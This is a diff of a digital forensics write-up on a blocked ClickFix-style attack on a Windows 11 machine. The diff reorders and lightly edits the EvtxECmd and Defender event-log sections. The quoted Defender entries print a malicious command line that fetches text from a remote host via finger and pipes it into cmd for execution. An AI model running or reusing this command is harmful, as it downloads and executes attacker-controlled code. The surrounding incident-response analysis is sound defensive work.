@@ -117,6 +117,15 @@ Using RegRipper, I analysed the SYSTEM hive and reviewed the BAM module output f
 ## Event Logs
 Since the last execution of Finger was blocked by Defender, it makes sense that this appeared in the event logs. To dig deeper, I also examined the event logs using [EventLogExplorer](https://eventlogxp.com/).
 
+### EvtxECmd
+
+Searching in the Event Log output of [EvtxECmd](https://github.com/EricZimmerman/evtx) for payload `finger`, returned two entries. These entries where both from the Defender logging.
+
+|Time Created|Event Id|Level|Provider|Channel|Process Id|Computer|User Id|Map Description|Payload Data1|Payload Data2|Payload Data3|Executable Info|
+|---|---|---|---|---|---|---|---|---|---|---|---|---|
+|2026-03-10 12:33:47|1116|Warning|Microsoft-Windows-Windows Defender|Microsoft-Windows-Windows Defender/Operational|3884|Win11|S-1-5-18|Detection - The antimalware platform detected malware or other potentially unwanted software|Malware name: VirTool:Win32/SuspClickFix.M3|Description: Tool (Severe)|Detection Time: 2026-03-10T12:33:47.730Z|CmdLine:_C:\Windows\System32\cmd.exe /c start /min cmd /c finger utrecht@graph.no\| cmd|
+|2026-03-10 12:34:47|1117|Info|Microsoft-Windows-Windows Defender|Microsoft-Windows-Windows Defender/Operational|3884|Win11|S-1-5-18|Detection - The antimalware platform performed an action to protect your system from malware or other potentially unwanted software|Malware name: VirTool:Win32/SuspClickFix.M3|Description: Tool (Severe)|Detection Time: 2026-03-10T12:33:47.730Z|CmdLine:_C:\Windows\System32\cmd.exe /c start /min cmd /c finger utrecht@graph.no\| cmd|
+
 ### Microsoft-Windows-Windows Defender Operational
 
 This gave the same result as in the EvtxECmd output. Two related entries in the Defender Antivirus logs:
@@ -125,15 +134,6 @@ This gave the same result as in the EvtxECmd output. Two related entries in the 
 |---|---|---|---|---|---|---|
 |Warning|10/03/2026|12:33:47|1116|Microsoft-Windows-Windows Defender|\System|Microsoft Defender Antivirus has detected malware or other potentially unwanted software. […] Name: VirTool:Win32/SuspClickFix.M3 ID: 2147962014 Severity: Severe Category: Tool Path: CmdLine:_C:\Windows\System32\cmd.exe /c start /min cmd /c finger utrecht@graph.no\| cmd […]|
 |Information|10/03/2026|12:34:47|1117|Microsoft-Windows-Windows Defender|\System|Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.[…]Name: VirTool:Win32/SuspClickFix.M3 ID: 2147962014 Severity: Severe Category: Tool Path: CmdLine:_C:\Windows\System32\cmd.exe /c start /min cmd /c finger utrecht@graph.no\| cmd […]|
-
-### EvtxECmd
-
-Searching in the Event Log output of EvtxECmd for payload for `finger`, returned two entries. These entries where both from the Defender logging.
-
-|Time Created|Event Id|Level|Provider|Channel|Process Id|Computer|User Id|Map Description|Payload Data1|Payload Data2|Payload Data3|Executable Info|
-|---|---|---|---|---|---|---|---|---|---|---|---|---|
-|2026-03-10 12:33:47|1116|Warning|Microsoft-Windows-Windows Defender|Microsoft-Windows-Windows Defender/Operational|3884|Win11|S-1-5-18|Detection - The antimalware platform detected malware or other potentially unwanted software|Malware name: VirTool:Win32/SuspClickFix.M3|Description: Tool (Severe)|Detection Time: 2026-03-10T12:33:47.730Z|CmdLine:_C:\Windows\System32\cmd.exe /c start /min cmd /c finger utrecht@graph.no\| cmd|
-|2026-03-10 12:34:47|1117|Info|Microsoft-Windows-Windows Defender|Microsoft-Windows-Windows Defender/Operational|3884|Win11|S-1-5-18|Detection - The antimalware platform performed an action to protect your system from malware or other potentially unwanted software|Malware name: VirTool:Win32/SuspClickFix.M3|Description: Tool (Severe)|Detection Time: 2026-03-10T12:33:47.730Z|CmdLine:_C:\Windows\System32\cmd.exe /c start /min cmd /c finger utrecht@graph.no\| cmd|
 
 ### Hayabusa
 
